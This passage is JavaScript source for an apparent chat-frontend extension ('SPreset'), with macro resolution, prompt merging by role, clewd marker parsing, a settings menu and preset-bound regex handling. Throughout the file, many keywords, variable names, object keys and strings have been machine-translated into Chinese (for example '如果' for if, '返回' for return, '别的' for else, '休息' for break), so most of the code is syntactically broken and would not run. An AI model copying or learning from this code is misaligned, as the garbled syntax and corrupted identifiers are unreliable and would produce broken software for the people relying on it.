        `{{${inner}}}`，
        _name1，
        _name2，
        _原来的，
        _团体，
        _replaceCharacterCard，
        附加宏，
        postProcessFn，
      ）
      .replaceAll('{', '<|lb|>')
      .replaceAll('}', '<|rb|>');
    返回字符串(替换后)；
  };

  // 使用栈进行由左到右扫描；遇到 }} 立即解析最近的 {{...}}
  // 顺序会是：先解第一步遇到的外层里的最内层，再回到外层——也就是你要的1-3-4-2-6-5
  常量 MAX_STEPS = 1_000_000; // 防御型上限
  令步数 = 0；

  while (true) {
    令 i = 0；
    const stack = [];
    let replacedThisRound = false;

    while (i < s.length) {
      如果（++步数 > MAX_STEPS）{
        throw new Error('resolveMacrosSync:超过MAX_STEPS(可能存在未闭合的大阀门或异常增长)');
      }

      // 命中 {{ 入栈
      如果 (s[i] === '{' && s[i + 1] === '{') {
        stack.push(i);
        i += 2;
        继续;
      }

      // 命中 }} 出栈并立即解析替换
      如果 (s[i] === '}' && s[i + 1] === '}') {
        如果 (stack.length > 0) {
          const start = stack.pop();
          const inner = s.slice(start + 2, i);
          const replacement = resolveOne(inner.replaceAll('{', '<|lb|>').replaceAll('}', '<|rb|>'));

          // 原位替换： [0,start) + 替换 + (i+2,end)
          s = s.slice(0, start) + replacement + s.slice(i + 2);

          // 将扫描支架安装在替换后的支架上，继续右扫
          i = 起始位置 + 替换长度；
          replacedThisRound = true;
          继续;
        } 别的 {
          // 孤立的 }}，跳过
          i += 2;
          继续;
        }
      }

      i += 1;
    }

    // 本轮没有任何替换则结束
    如果 (!replacedThisRound) 则跳出；
  }

  // 还原之前对花括号的保护
  return s.replaceAll('<|lb|>', '{').replaceAll('<|rb|>', '}');
}

function reloadSettings() {
  const defaultPresetSettings = {
    ChatSquash：{
      已启用：否
      separate_chat_history: false,
      parse_clewd: true,
      user_role_system: false,
      角色：'助理'
      stop_string: '用户:',
      用户前缀：'\n\n用户：'，
      用户后缀：''，
      char_prefix: '\n\n助理：',
      char_suffix: '',
      prefix_system: '',
      后缀系统：''，
      enable_squashed_separator: false,
      squashed_separator_regex: false,
      squashed_separator_string: '',
      squashed_post_script_enable: false,
      squashed_post_script: '',
      re_split: false,
    },
    RegexBinding: {},
    MacroNest：false，
    ToolBindings: {},
  };
  const defaultGlobalSettings = {
    RegexBinding: {},
  };
  如果 (oldST || !ctx.chatCompletionSettings.extensions || !ctx.chatCompletionSettings.extensions.SPreset) {
    如果 (!ctx.chatCompletionSettings.extensions) {
      ctx.chatCompletionSettings.extensions = {};
    }
    const settingsFromPrompt = getPrompt('SPresetSettings');
    如果 (settingsFromPrompt) {
      ctx.chatCompletionSettings.extensions.SPreset = JSON.parse(settingsFromPrompt);
    }
  }
  const temp1 = ctx.chatCompletionSettings.extensions.SPreset;
  如果 (temp1 && !temp1.ChatSquash) {
    temp1.ChatSquash = defaultPresetSettings.ChatSquash;
  }
  如果 (temp1 && !temp1.ToolBindings) {
    temp1.ToolBindings = {};
  }
  const temp2 = ctx.extensionSettings.SPreset;
  SPresetSettings = temp1 || defaultPresetSettings;
  SGlobalSettings = temp2 || defaultGlobalSettings;
}

function injectSPresetMenu() {
  const menuButton = $(`
    <div id="open_s_preset_menu" class="menu_button menu_button_icon Interactiveable" title="打开默认增强菜单" tabindex="0">
      <i class="fa-fw fa-solid fa-s" style="color: #ff0000;"></i>
    </div>
  `);
  $('#openai_preset_import_file').before(menuButton);

  // 绑定菜单按钮点击事件
  menuButton.on('点击', openSPresetMenu);

  function openSPresetMenu() {
    重新加载设置();
    loadSettingsToChatSquashForm();
    loadSettingsToMacroNestForm();
    ctx.callGenericPopup(settingsDom.get(0), ctx.POPUP_TYPE.DISPLAY);
  }

  //初始化所有功能模块
  初始化菜单部分();
}

//添加功能模块到菜单的函数
function addMenuSection(sectionId, title, content, css = null) {
  如果 (css) {
    injectCssStyles(`styles_${sectionId}`, css);
  }
  const sectionHtml = $(`
    <div id="${sectionId}_section" class="${sectionId.replace('_', '-')}">
      <div class="inline-drawer">
        <div class="inline-drawer-toggle inline-drawer-header">
            <b>${title}</b>
            <div class="inline-drawer-icon fa-solid interactable up fa-circle-chevron-up" tabindex="0"></div>
        </div>
        <div class="inline-drawer-content" style="display: none">
          ${content}
        </div>
      </div>
    </div>
    <hr />
  `);

  settingsDom.append(sectionHtml);
  返回 sectionHtml；
}

function injectCssStyles(id, css) {
  const style = document.createElement('style');
  style.id = id;
  style.innerHTML = css;
  document.head.appendChild(style);
}

//初始化所有功能模块
function initializeMenuSections() {
  // 清空现有内容
  console.log('initializeMenuSections');
  console.log(settingsDom);
  settingsDom.empty();
  settingsDom.append($(`<h3><strong>默认增强功能</strong></h3>`));
  injectCssStyles(
    's_preset_settings_css'，
    `
  #s_preset_settings {
    最大高度：600像素；
    overflow-y: auto;
  }
  `,
  ）；
}

const MacroNest = () => {
  const macroNestMenuItems = `
    <div class="inline-drawer-content" style="display: block;">
      <label class="flex-container">
        <input type="checkbox" id="macro_nest_enabled"><span>启用宏开放</span>
      </label>
    </div>
  `;
  const menu = addMenuSection('macro_nest', '宏婚纱', MacroNestMenuItems);
  menu.find('#macro_nest_enabled').on('change', function () {
    SPresetSettings.MacroNest = this.checked;
    如果 (!ctx.chatCompletionSettings.extensions) {
      ctx.chatCompletionSettings.extensions = {};
    }
    ctx.chatCompletionSettings.extensions.SPreset = SPresetSettings;
    如果 (getPrompt('SPresetSettings')) {
      setPrompt('SPresetSettings', JSON.stringify(SPresetSettings));
    } 别的 {
      addPrompt('SPresetSettings', 'SPreset 配置', JSON.stringify(SPresetSettings));
    }
    ctx.saveSettingsDebounced();
  });
  函数 loadSettingsToForm() {
    menu.find('#macro_nest_enabled').prop('checked', SPresetSettings.MacroNest);
  }
  返回 loadSettingsToForm；
};

const ChatSquash = () => {
  const chatSquashMenuItems = `
    <div class="inline-drawer-content" style="display: block;">
			<label class="flex-container">
				<input type="checkbox" id="squash_enabled"><span>启用提示词合并</span>
			</label>
      <div id="squash_enabled_content" style="display: none;">

            <div class="flex-container" title="仅合并聊天记录">
                <input type="checkbox" id="separate_chat_history"><span>仅限合并聊天记录</span>
            </div>
            <div class="flex-container" title="解析clewd标记">
                <input type="checkbox" id="parse_clewd"><span>解析 clewd 标记</span>
            </div>
            <div class="flex-container" title="系统消息用户角色">
                <input type="checkbox" id="user_role_system"><span>系统消息用户角色</span>
            </div>

            <hr>

            <div class="flex-container flexFlowColumn">
                <label for="squash_role">
                     合并至角色
                </label>
                <select id="squash_role" class="text_pole">
                    <option value="system">系统</option>
                    <选项值=“用户”>用户</选项>
                    <option value="assistant">模型</option>
                    <option value="follow">上一个角色</option>
                </select>
            </div>

            <hr>

            <div class="flex-container flexFlowColumn" title="停止字符">
                <label for="stop_string">
                    停止字符
                </label>
                <div class="flex-container" title="启用停止字符串">
                    <input type="checkbox" id="enable_stop_string"><span>启用停止字符</span>
                </div>
                <div class="flex-container">
                    <input id="stop_string" name="stop_string" class="text_pole flex1 wide100p" maxlength="500" size="35" type="text" autocomplete="off">
                </div>
            </div>

            <hr>

            <div class="flex-container flexFlowColumn" title="用户消息出口">
                <label for="user_prefix">用户消息出口</label>
                <div class="flex-container">
                    <textarea id="user_prefix" name="user_prefix" class="text_pole flex1 wide100p" maxlength="500" size="35" type="text" autocomplete="off"></textarea>
                </div>
            </div>

            <div class="flex-container flexFlowColumn" title="用户消息后缀">
                <label for="user_suffix">用户消息后缀</label>
                <div class="flex-container">
                    <textarea id="user_suffix" name="user_suffix" class="text_pole flex1 wide100p" maxlength="500" size="35" type="text" autocomplete="off"></textarea>
                </div>
            </div>

            <div class="flex-container flexFlowColumn" title="角色消息海外">
                <label for="char_prefix">
                    角色消息远端
                </label>
                <div class="flex-container">
                    <textarea id="char_prefix" name="char_prefix" class="text_pole flex1 wide100p" maxlength="500" size="35" type="text" autocomplete="off"></textarea>
                </div>
            </div>

            <div class="flex-container flexFlowColumn" title="角色消息后缀">
                <label for="char_suffix">
                    角色消息后缀
                </label>
                <div class="flex-container">
                    <textarea id="char_suffix" name="char_suffix" class="text_pole flex1 wide100p" maxlength="500" size="35" type="text" autocomplete="off"></textarea>
                </div>
            </div>

            <div class="flex-container flexFlowColumn" title="系统消息出口">
                <label for="prefix_system">
                    系统消息出口
                </label>
                <div class="flex-container">
                    <textarea id="prefix_system" name="prefix_system" class="text_pole flex1 wide100p" maxlength="500" size="35" type="text" autocomplete="off"></textarea>
                </div>
            </div>

            <div class="flex-container flexFlowColumn" title="系统消息后缀">
                <label for="suffix_system">
                    系统消息后缀
                </label>
                <div class="flex-container">
                    <textarea id="suffix_system" name="suffix_system" class="text_pole flex1 wide100p" maxlength="500" size="35" type="text" autocomplete="off"></textarea>
                </div>
            </div>

            
            <hr>
            <strong class="noass-center-text">后期处理</strong>

            <div class="flex-container flexFlowColumn" title="不压缩部分">
                <label for="squashed_separator_string">
                    <strong>不压缩标记</strong>
                </label>
                <div class="flex-container" title="启用不标记压缩">
                    <input type="checkbox" id="enable_squashed_separator"><span>启用不压缩标记</span>
                </div>
                <div class="flex-container" title="压缩历史记录分隔符的正则表达式模式。">
                    <input type="checkbox" id="squashed_separator_regex"><span>正则模式</span>
                </div>
                <div class="flex-container">
                    <input id="squashed_separator_string" class="text_pole flex1 wide100p" maxlength="500" size="35" type="text" autocomplete="off">
                </div>

                <hr>
            </div>
            <div class="flex-container" title="合并后处理后，将提示词按前后缀重新分割回不同角色的独立消息">
                <input type="checkbox" id="re_split"><span>重新分割提示词</span>
            </div>
            <div class="flex-container flexFlowColumn">
                <strong>后期处理脚本</strong>
                <div class="flex-container" title="启用后处理脚本">
                    <input type="checkbox" id="squashed_post_script_enable"><span>启用后处理脚本</span>
                </div>
                <div class="flex-container flexFlowColumn">
                    <label for="squashed_post_script">
                        剧本内容
                    </label>
                    <div class="flex-container">
                        <textarea id="squashed_post_script" class="text_pole flex1 wide100p" size="35" type="text" autocomplete="off"></textarea>
                    </div>
                </div>
            </div>            

            <hr>
        </div>
    </div>
  `;
  const menu = addMenuSection('chat_squash', '聊天记录合并', chatSquashMenuItems);
  menu.find('#squash_enabled').on('change', function () {
    $('#squash_enabled_content').css({
      display: $(this).prop('checked') ? 'block' : 'none',
    });
    saveSettingsFromForm();
  });

  menu.find('#squash_enabled_content').on('change', function () {
    saveSettingsFromForm();
  });

  loadSettingsToForm();

  函数 loadSettingsToForm() {
    console.debug('loadSettingsToForm');
    menu.find('#squash_enabled').prop('checked', SPresetSettings.ChatSquash.enabled);
    menu.find('#separate_chat_history').prop('checked', SPresetSettings.ChatSquash.separate_chat_history);
    menu.find('#parse_clewd').prop('checked', SPresetSettings.ChatSquash.parse_clewd);
    menu.find('#user_role_system').prop('checked', SPresetSettings.ChatSquash.user_role_system);
    menu.find('#squash_role').val(SPresetSettings.ChatSquash.role);
    menu.find('#stop_string').val(SPresetSettings.ChatSquash.stop_string);
    menu.find('#enable_stop_string').prop('checked', SPresetSettings.ChatSquash.enable_stop_string);
    menu.find('#user_prefix').val(SPresetSettings.ChatSquash.user_prefix);
    menu.find('#user_suffix').val(SPresetSettings.ChatSquash.user_suffix);
    menu.find('#char_prefix').val(SPresetSettings.ChatSquash.char_prefix);
    menu.find('#char_suffix').val(SPresetSettings.ChatSquash.char_suffix);
    menu.find('#prefix_system').val(SPresetSettings.ChatSquash.prefix_system);
    menu.find('#suffix_system').val(SPresetSettings.ChatSquash.suffix_system);
    menu.find('#enable_squashed_separator').prop('checked', SPresetSettings.ChatSquash.enable_squashed_separator);
    menu.find('#squashed_separator_regex').prop('checked', SPresetSettings.ChatSquash.squashed_separator_regex);
    menu.find('#squashed_separator_string').val(SPresetSettings.ChatSquash.squashed_separator_string);
    menu.find('#squashed_post_script_enable').prop('checked', SPresetSettings.ChatSquash.squashed_post_script_enable);
    menu.find('#squashed_post_script').val(SPresetSettings.ChatSquash.squashed_post_script);
    menu.find('#re_split').prop('checked', SPresetSettings.ChatSquash.re_split);
    menu.find('#squash_enabled_content').css({
      display: menu.find('#squash_enabled').prop('checked') ? 'block' : 'none',
    });
  }

  function saveSettingsFromForm() {
    console.debug('saveSettingsFromForm');
    SPresetSettings.ChatSquash.enabled = menu.find('#squash_enabled').prop('checked');
    SPresetSettings.ChatSquash.separate_chat_history = menu.find('#separate_chat_history').prop('checked');
    SPresetSettings.ChatSquash.parse_clewd = menu.find('#parse_clewd').prop('checked');
    SPresetSettings.ChatSquash.user_role_system = menu.find('#user_role_system').prop('checked');
    SPresetSettings.ChatSquash.role = menu.find('#squash_role').val();
    SPresetSettings.ChatSquash.stop_string = menu.find('#stop_string').val();
    SPresetSettings.ChatSquash.enable_stop_string = menu.find('#enable_stop_string').prop('checked');
    SPresetSettings.ChatSquash.user_prefix = menu.find('#user_prefix').val();
    SPresetSettings.ChatSquash.user_suffix = menu.find('#user_suffix').val();
    SPresetSettings.ChatSquash.char_prefix = menu.find('#char_prefix').val();
    SPresetSettings.ChatSquash.char_suffix = menu.find('#char_suffix').val();
    SPresetSettings.ChatSquash.prefix_system = menu.find('#prefix_system').val();
    SPresetSettings.ChatSquash.suffix_system = menu.find('#suffix_system').val();
    SPresetSettings.ChatSquash.enable_squashed_separator = menu.find('#enable_squashed_separator').prop('checked');
    SPresetSettings.ChatSquash.squashed_separator_regex = menu.find('#squashed_separator_regex').prop('checked');
    SPresetSettings.ChatSquash.squashed_separator_string = menu.find('#squashed_separator_string').val();
    SPresetSettings.ChatSquash.squashed_post_script_enable = menu.find('#squashed_post_script_enable').prop('checked');
    SPresetSettings.ChatSquash.squashed_post_script = menu.find('#squashed_post_script').val();
    SPresetSettings.ChatSquash.re_split = menu.find('#re_split').prop('checked');
    如果 (!ctx.chatCompletionSettings.extensions) {
      ctx.chatCompletionSettings.extensions = {};
    }
    ctx.chatCompletionSettings.extensions.SPreset = SPresetSettings;
    如果 (getPrompt('SPresetSettings')) {
      setPrompt('SPresetSettings', JSON.stringify(SPresetSettings));
    } 别的 {
      addPrompt('SPresetSettings', 'SPreset 配置', JSON.stringify(SPresetSettings));
    }
    ctx.saveSettingsDebounced();
  }

  const listenerList = ctx.eventSource.events[ctx.eventTypes.CHAT_COMPLETION_SETTINGS_READY];
  如果 (listenerList) {
    for (let i = 0; i < listenerList.length; i++) {
      if (listenerList[i].toString().includes('合并配置 >>>>>>>>>>>>> 最终消息结构 <<<<<<<<<<<<<<<<<')) {
        const originalListener = listenerList[i];
        listenerList[i] = data1 => {
          如果 (!SPresetSettings.ChatSquash.enabled) {
            返回原始监听器（数据1）；
          }
          返回;
        };
      }
    }
  }

  const originalOn = ctx.eventSource.on;
  ctx.eventSource.on = function (event, listener) {
    // 都他妈别跟我抢
    如果 (event === ctx.eventTypes.CHAT_COMPLETION_SETTINGS_READY) {
      if (listener.toString().includes('合并配置 >>>>>>>>>>>>> 最终消息结构 <<<<<<<<<<<<<<<<<')) {
        返回 originalOn.apply(this, [
          事件，
          数据 => {
            如果 (!SPresetSettings.ChatSquash.enabled) {
              返回监听器(数据)；
            }
            返回;
          },
        ]);
      }
      return originalOn.apply(this, [event, listener]);
    }
    return originalOn.apply(this, [event, listener]);
  };

  const handleChatCompletionPromptReady = data => {
    如果 (!SPresetSettings.ChatSquash.enabled) {
      如果 (Array.isArray(data?.prompt)) {
        globalThis.SToolBookPromptCompat?.applySeamlessPromptInjection?.(data.prompt, 'SPreset/GENERATE_AFTER_DATA/bypass');
      }
      返回;
    }

    if (!Array.isArray(data?.prompt)) {
      返回;
    }

    const restoreSeamlessTail = () => {
      globalThis.SToolBookPromptCompat?.applySeamlessPromptInjection?.(data.prompt, 'SPreset/GENERATE_AFTER_DATA');
    };
    console.log('data', data);
    const settings = SPresetSettings.ChatSquash;
    const promptManager = SPresetImports.promptManager;
    如果 (settings.separate_chat_history) {
      data.prompt.length = 0;
      data.prompt.push(...getChat(promptManager));
      console.log('data.prompt', data.prompt);
    } 别的 {
      squashPrompts(data.prompt);
    }

    function getChat(chatData) {
      const chat = [];
      const toSquash = [];
      for (const item of chatData.messages.collection) {
        如果 (item 是 SPresetImports.MessageCollection 的实例) {
          如果 (item.identifier === 'chatHistory') {
            chat.push(...squashPrompts(item.getChat()));
          } 别的 {
            chat.push(...item.getChat());
          }
        } else if (item instanceof SPresetImports.Message && (item.content || item.tool_calls)) {
          const message = {
            角色：item.role，
            内容：item.content，
            ...(item.name ? { name: item.name } : {}),
            ...(item.tool_calls ? { tool_calls: item.tool_calls } : {}),
            ...(item.role === 'tool' ? { tool_call_id: item.identifier } : {}),
          };
          如果 (item.identifier.startsWith('chatHistory')) {
            toSquash.push(message);
          } 别的 {
            如果 (toSquash.length > 0) {
              chat.push(...squashPrompts(toSquash));
              toSquash.length = 0;
            }
            chat.push(消息);
          }
        } 别的 {
          console.warn(`跳过集合中的无效或空消息：${JSON.stringify(item )}`);
        }
      }
      回复聊天；
    }
  };

  ctx.eventSource.on(ctx.eventTypes.APP_READY, data => {
    console.log('APP_READY', data);
    ctx.eventSource.makeLast(ctx.eventTypes.GENERATE_AFTER_DATA, handleChatCompletionPromptReady);
    const listenerList = ctx.eventSource.events[ctx.eventTypes.CHAT_COMPLETION_SETTINGS_READY];
    如果 (listenerList) {
      for (let i = 0; i < listenerList.length; i++) {
        如果 （
          listenerList[i].toString().includes('合并配置 >>>>>>>>>>>>> 最终消息结构 <<<<<<<<<<<<<<<<<')
        ) {
          const originalListener = listenerList[i];
          listenerList[i] = data1 => {
            如果 (!SPresetSettings.ChatSquash.enabled) {
              返回原始监听器（数据1）；
            }
            返回;
          };
        }
      }
    }
  });
  ctx.eventSource.on(ctx.eventTypes.SETTINGS_UPDATED, data => {
    console.log('APP_READY', data);
    ctx.eventSource.makeLast(ctx.eventTypes.GENERATE_AFTER_DATA, handleChatCompletionPromptReady);
  });

  ctx.eventSource.on(ctx.eventTypes.CHAT_COMPLETION_SETTINGS_READY, data => {
    如果 (SPresetSettings.ChatSquash.enable_stop_string && SPresetSettings.ChatSquash.stop_string && SPresetSettings.ChatSquash.enabled) {
      let custom_stopping_strings = [];
      尝试 {
        custom_stopping_strings = JSON.parse(SPresetSettings.ChatSquash.stop_string);
      } catch (e) {
        custom_stopping_strings = [SPresetSettings.ChatSquash.stop_string];
      }
      如果 (data.stop) {
        data.stop = data.stop.filter(item => !custom_stopping_strings.includes(item));
        data.stop.push(...custom_stopping_strings);
      } 别的 {
        data.stop = custom_stopping_strings;
      }
    }
  });

  // 在生成前同步工具注册
  ctx.eventSource.on(ctx.eventTypes.CHAT_COMPLETION_SETTINGS_READY, () => {
    syncSPresetToolRegistrations();
  });

  函数 squashPrompts(prompts) {
    const settings = SPresetSettings.ChatSquash;
    let squashRole = settings.role;
    如果 (settings.role === 'follow') {
      squashRole = prompts[0]?.role || 'user';
    }
    const newPrompts = [...prompts];
    prompts.length = 0;
    let lastRole = '';
    let mergedContent = '';

    const attachments = [];

    // 预先解析后缀，用于合并和可能的重新分割
    const resolveAffix = (prefix, suffix) => ({
      prefix: ctx.substituteParams(prefix),
      后缀：ctx.substituteParams(后缀)
    });
    const affix = {
      用户: resolveAffix(settings.user_prefix, settings.user_suffix),
      助手：resolveAffix(settings.char_prefix, settings.char_suffix),
      系统：resolveAffix(settings.prefix_system, settings.suffix_system),
    };
    const segmentRoles = [];

    function pushMergedContent() {
      const processed = postProcess(mergedContent);
      如果 (settings.re_split && segmentRoles.length > 0) {
        const splitMsgs = reSplitContent(processed, affix);
        for (const msg of splitMsgs) {
          prompts.push({
            角色：msg.role，
            content: restoreAttachments(msg.content, attachments),
          });
        }
      } 别的 {
        prompts.push({
          角色：squashRole，
          内容：restoreAttachments(已处理，附件)
        });
      }
      mergedContent = '';
      segmentRoles.length = 0;
    }

    function reSplitContent(content, affix) {
      const result = [];
      剩余部分等于内容；
      const roles = ['user', 'assistant', 'system'];

      while (剩余长度 > 0) {
        let matchedRole = null;

        for (const role of roles) {
          const { prefix } = affix[role];
          如果（前缀 && 剩余部分以（前缀）开头）{
            匹配角色 = 角色；
            剩余部分 = 剩余部分.切片(前缀.长度);
            休息;
          }
        }

        如果 (!matchedRole) {
          休息;
        }

        const { suffix } = affix[matchedRole];
        let endIdx = remaining.length;

        for (const role of roles) {
          const nextPrefix = affix[role].prefix;
          如果 (nextPrefix) {
            const idx = remaining.indexOf(nextPrefix);
            如果 (idx !== -1 && idx < endIdx) {
              endIdx = idx;
            }
          }
        }

        let segmentContent = remaining.slice(0, endIdx);

        如果（后缀 && 段内容以（后缀）结尾）{
          segmentContent = segmentContent.slice(0, -suffix.length);
        }

        segmentContent = segmentContent.trim();
        如果 (segmentContent) {
          result.push({ role: matchedRole, content: segmentContent });
        }

        剩余部分 = 剩余部分.slice(endIdx);
      }

      返回结果；
    }

    for (const prompt of newPrompts) {
      如果 (!prompt.content && !prompt.tool_calls) {
        继续;
      }
      if (Array.isArray(prompt.content)) {
        let textContent = '';
        for (const item of prompt.content) {
          如果 (item.type === 'text') {
            textContent += item.text;
          } 别的 {
            textContent += `<｜附件｜${attachments.length}｜>`;
            attachments.push(item);
          }
        }
        prompt.content = textContent;
      }
      如果 (settings.user_role_system && prompt.role === 'system') {
        prompt.role = 'user';
      }
      let separate = false;
      如果 (settings.enable_squashed_separator && settings.squashed_separator_string) {
        如果 (settings.squashed_separator_regex) {
          const regex = new RegExp(settings.squashed_separator_string);
          如果 (regex.test(prompt.content)) {
            分离 = true；
            prompt.content = prompt.content.replace(regex, '');
          }
        } else if (prompt.content.includes(settings.squashed_separator_string)) {
          prompt.content = prompt.content.replace(settings.squashed_separator_string, '');
          分离 = true；
        }
      }
      如果 (!separate && settings.parse_clewd) {
        const marker = '<|no-trans|>';
        如果 (prompt.content.includes(marker)) {
          分离 = true；
          prompt.content = prompt.content.replace(marker, '');
        }
      }
      如果 (prompt.tool_calls || prompt.role === 'tool') {
        分离 = true；
      }
      如果（分开）{
        如果 (mergedContent) {
          pushMergedContent();
        }
        如果 (settings.role === 'follow') {
          squashRole = prompt.role;
        }
        lastRole = '';
        prompts.push(提示)；
        继续;
      }
      如果 (prompt.role !== lastRole) {
        如果 (lastRole) {
          mergedContent += affix[lastRole].suffix;
        }
        mergedContent += affix[prompt.role].prefix;
        segmentRoles.push(prompt.role);
      } 别的 {
        mergedContent += '\n';
      }
      mergedContent += prompt.content;
      lastRole = prompt.role;
    }
    如果 (mergedContent) {
      如果 (lastRole) {
        mergedContent += affix[lastRole].suffix;
      }
      pushMergedContent();
    }
    返回提示；
  }

  function restoreAttachments(content, attachments) {
    如果（附件长度 === 0）{
      返回内容；
    }
    const contentParts = [];
    const matchPattern = /<｜附件｜(\d+)｜>/g;
    令匹配；
    while ((match = matchPattern.exec(content)) !== null) {
      contentParts.push({ type: 'text', text: content.slice(0, match.index) });
      contentParts.push(attachments[match[1]]);
      content = content.slice(match.index + match[0].length);
    }
    contentParts.push({ type: 'text', text: content });
    返回内容部分；
  }

  function postProcess(prompt) {
    const hyperRegex = function (content, order) {
      const regexPattern =
        '<regex(?: +order *= *' +
        订单 +
        ')' +
        （订单号 === 2 ? '?' : ''）+
        '> *"(/?)(.*)\\1(.*?)" *: *"(.*?)" *</regex>';
      const matches = content.match(new RegExp(regexPattern, 'gm'));

      如果（匹配）{
        for (let i = 0; i < matches.length; i++) {
          const match = matches[i];
          尝试 {
            const reg = /<regex(?: +order *= *\d)?> *"(\/?)(.*)\1(.*?)" *: *"(.*?)" *<\/regex>/.exec(match);
            const replacePattern = new RegExp(reg[2], reg[3]);
            const replacement = JSON.parse('"' + reg[4].replace(/\\?"/g, '\\"') + '"');
            content = content.replace(replacePattern, replacement);
            console.debug('regex - \n' + content);
          } catch (e) {
            console.warn('正则表达式处理错误：', e);
          }
        }
      }
      返回内容；
    };

    const HyperPmtProcess = function (content) {
      const regex1 = hyperRegex(content, 1);
      内容 = 正则表达式1；

      const regex2 = hyperRegex(content, 2);
      内容 = 正则表达式2；

      const regex3 = hyperRegex(content, 3);
      内容 = 正则表达式3；

      内容 = 内容
        .replace(/<regex( +order *= *\d)?>.*?<\/regex>/gm, '')
        .replace(/\r\n|\r/gm, '\n')
        .replace(/\s*<\|curtail\|>\s*/g, '\n')
        .replace(/\s*<\|join\|>\s*/g, '')
        .replace(/\s*<\|space\|>\s*/g, ' ')
        .replace(/<\|(\\.*?)\|>/g, function (match, p1) {
          尝试 {
            return JSON.parse('"' + p1 + '"');
          } 抓住 {
            返回匹配项；
          }
        });

      返回内容
        .replace(/\s*<\|.*?\|>\s*/g, '\n\n')
        。修剪（）
        .replace(/^.+:/, '\n\n$&')
        .replace(/(?<=\n)\n(?=\n)/g, '');
    };
    如果 (SPresetSettings.ChatSquash.parse_clewd) {
      console.debug('HyperPmtProcess - \n' + prompt);
      prompt = HyperPmtProcess(prompt);
    }
    if (SPresetSettings.ChatSquash.squashed_post_script_enable) {
      const backup = prompt;
      尝试 {
        prompt = eval(SPresetSettings.ChatSquash.squashed_post_script)(prompt);
      } catch (e) {
        console.warn('已压缩的后脚本处理错误：', e);
        提示 = 备份；
      }
    }
    返回提示；
  }

  返回 loadSettingsToForm；
};

const RegexBinding = () => {
  const regexMenuItems = `
    <div class="flex-container">
      <div class="menu_button menu_button_icon" id="manage_preset_regexes" title="管理默认绑定正则">
        <i class="fa-solid fa-cogs"></i>
        <small>管理正则</small>
      </div>
      <div class="menu_button menu_button_icon" id="regex_binding_help" title="绑定正则使用说明">
        <i class="fa-solid fa-circle-info"></i>
        <小>使用说明</小>
      </div>
    </div>
  `;

  addMenuSection('regex_binding', '绑定内置正则', regexMenuItems);

  // 绑定事件处理
  settingsDom.find('#manage_preset_regexes').on('click', function () {
    // 关闭菜单并跳转到正则设置
    $('.popup-button-ok').click(); // 关闭当前弹窗

    $('#extensions-settings-button .drawer-toggle').click();
    $('.regex_settings .inline-drawer-toggle').click();
  });

  settingsDom.find('#regex_binding_help').on('click', function () {
    显示正则表达式绑定帮助();
  });

  // 显示绑定正则使用说明
  function showRegexBindingHelp() {
    const helpContent = `
    <div style="text-align: left; max-height: 400px; overflow-y: auto;">
      <h4>默认绑定则功能说明</h4>
      
      <h5>🎯主要功能</h5>
      <ul style="margin: 10px 0; padding-left: 20px;">
        <li><strong>预设绑定：</strong>将正则表达式直接保存在预设中，而不是全局设置</li>
        <li><strong>关联角色：</strong>绑定的正基础影响所有使用此预设的角色</li>
        <li><strong>规则锁定：</strong>可以锁定重要的规则，防止默认切换时丢失</li>
        <li><strong>批量管理：</strong>支持批量实现、取消和取消正则</li>
      </ul>
      
      <h5>📝使用步骤</h5>
      <ol style="margin: 10px 0; padding-left: 20px;">
        <li><strong>创建规则：</strong>点击“新建预设规则”创建新的规则规则</li>
        <li><strong>绑定现有：</strong>在全局正则列表中点击“↑”按钮将正则绑定到当前默认值</li>
        <li><strong>管理顺序：</strong>使用“预设则排序”调整则执行顺序</li>
        <li><strong>锁定保护：</strong>点击🔒按钮锁定重要事项，防止丢失</li>
        <li><strong>保存默认值：</strong>记得保存默认值则丢失</li>
      </ol>
      
      <h5>⚠️重要提示</h5>
      <ul style="margin: 10px 0; padding-left: 20px; color: #ff6b6b;">
        <li>默认绑定的规则则保存在默认文件中，切换默认值时会自动加载对应的规则</li>
        <li>修改后请及时保存默认，否则可能会丢失更改</li>
        <li>正则执行顺序很重要，排序靠前的正底部先执行</li>
        <li>锁定的规则不会导致默认切换而丢失，适用于通用规则</li>
      </ul>
      
      <h5>🔧高级功能</h5>
      <ul style="margin: 10px 0; padding-left: 20px;">
        <li><strong>批量操作：</strong>选中多个正则则可以批量实现、取消或取消</li>
        <li><strong>排序功能：</strong>支持拖拽排序、批量移动、工件顺序等</li>
        <li><strong>导入导出：</strong>可以导出正确则配置与他人分享</li>
        <li><strong>实时预览：</strong>编辑正则时可以实时测试效果</li>
      </ul>
    </div>
  `;

    ctx.callGenericPopup(helpContent, ctx.POPUP_TYPE.TEXT, '', {
      okButton: '我知道了',
    });
  }
  // eslint-disable-next-line no-control-regex
  const sanitizeFileName = name => name.replace(/[\s.<>:"/\\|?*\x00-\x1f\x7f]/g, '_').toLowerCase();

  function getFileText(file) {
    返回一个新的 Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.readAsText(file);
      reader.onload = function () {
        resolve(String(reader.result));
      };
      reader.onerror = function (error) {
        拒绝(错误)；
      };
    });
  }
  const extensions = ctx.extensionSettings;
  const presetRegexes = getRegexesFromPreset();
  const lockedRegexes = loadLockedRegexes();

  // 如果可用，请加载已保存的激活顺序
  如果 (SGlobalSettings.RegexBinding && SGlobalSettings.RegexBinding.activationOrder) {
    window.__regexScriptOrder = SGlobalSettings.RegexBinding.activationOrder;
  }

  如果 (版本号 >= 11305) {
    // 11305+ 版本内置正则表达式绑定；ST 是数据源，仅从 ST 同步。
    const stHasRegexScripts =
      ctx.chatCompletionSettings.extensions.regex_scripts &&
      ctx.chatCompletionSettings.extensions.regex_scripts.length > 0;

    // 如果存在，则迁移旧的 xiaobai_ext 格式。
    如果 （
      ctx.chatCompletionSettings.prompt_order[1] &&
      ctx.chatCompletionSettings.prompt_order[1].xiaobai_ext &&
      ctx.chatCompletionSettings.prompt_order[1].xiaobai_ext.regexBindings
    ) {
      ctx.chatCompletionSettings.prompt_order[1].xiaobai_ext.regexBindings.scripts
        .filter(s => !presetRegexes.find(s2 => s2.id === s.id))
        .forEach(s => presetRegexes.push(s));
      ctx.chatCompletionSettings.prompt_order[1].xiaobai_ext.regexBindings = null;
    }

    如果 (stHasRegexScripts) {
      // ST 已有 regex_scripts（内置系统具有权威性），从 ST 同步
      预设正则表达式长度 = 0;
      presetRegexes.push(...ctx.chatCompletionSettings.extensions.regex_scripts);
      saveRegexesToPreset(presetRegexes);
    } else if (presetRegexes.length > 0) {
      // ST 没有 regex_scripts，但我们有旧数据，请迁移到 ST
      syncToST();
